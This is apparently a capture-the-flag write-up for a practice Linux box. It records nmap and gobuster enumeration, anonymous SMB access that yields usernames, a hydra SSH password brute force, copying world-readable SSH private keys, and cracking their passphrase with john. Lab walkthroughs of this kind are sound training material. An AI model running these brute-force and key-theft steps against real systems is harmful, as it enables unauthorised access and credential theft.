# Basic Pentesting - Linux

**IP may vary over the document**

## Enumeration

### Nmap: `nmap -sV -oN nmap-initial $IP -v`

```bash
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7
```

### Gobuster 

+ **port 80: `gobuster dir -u http://$IP:80 -w ../wordlist_common.txt | tee gobuster-scan`**

```bash
/.hta                 (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/development          (Status: 301) [Size: 318] [--> http://10.10.188.76/development/]
/index.html           (Status: 200) [Size: 158]                                       
/server-status        (Status: 403) [Size: 300]                                       
```

+ **port 8080: `gobuster dir -u http://$IP:8080 -w ../wordlist_common.txt | tee web8080-scan`**

```bash
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]             
/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
/manager              (Status: 302) [Size: 0] [--> /manager/]     
```

Checking */development* dir ..and we have some files

Found a note inside *dev.txt* file mentioning struts v2.5.12

```bash
$searchslpoit struts 2.5

Apache Struts 2.5 < 2.5.12 - REST Plugin XStream Remote Code Execution                   | linux/remote/42627.py
```

`searchspolit` lists a exploit for the version but on further inspection of the exploit it requires url path. We don't have that. I try I bunch of things that I could think of just so I could get some path. Nothing....

Looking at port 8080... we have apache but in order to login in to the manager I need username/password... Creds are usually stored in `$CATALINA_HOME/conf/tomcat-users.xml`. Checked if I could read it..

Tried the following paths:
```bash
CATALINA_HOME="/usr/local/apache-tomcat-9.x.xx"
CATALINA_HOME="/usr/apache/tomcat/"
```

**Did not work**

SMB enumration now.. `smbmap -H $IP -R`

```bash
[+] Guest session       IP: 10.10.77.191:445    Name: 10.10.77.191                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Anonymous                                               READ ONLY
        .\Anonymous\*
        dr--r--r--                0 Thu Apr 19 23:01:20 2018    .
        dr--r--r--                0 Thu Apr 19 22:43:06 2018    ..
        fr--r--r--              173 Thu Apr 19 22:59:55 2018    staff.txt
        IPC$                                                    NO ACCESS       IPC Service (Samba Server 4.3.11-Ubuntu)
```

Using `smbclient` to make a smb connection and *get* the *staff.txt* file.

Contents of *staff.txt*

```
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```

Did I just got the usernames? `jan` and `kay`

*After I was done with the box I found that we had to bruteforce both username and password... though I got usernames from smb .. so I guess all's well if it ends well :)*

Using `hydra` for bruteforcing password for ssh: `hydra -l jan -P ../rockyou.txt ssh://$IP`

Finally got the password `armando` after waiting for a long time.

After doing ssh with user jan on box and executing *linPEAS* it found:

```bash
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```

World readable ssh keys.. awesome

Coping id_rsa key back to attacking machine and running `ssh2john.py` on it to convert to hash. Finally executing john on that hash we get our passphrase.

Using ssh to login into box using user kay. Just cat out the *pass.bak* file for last flag
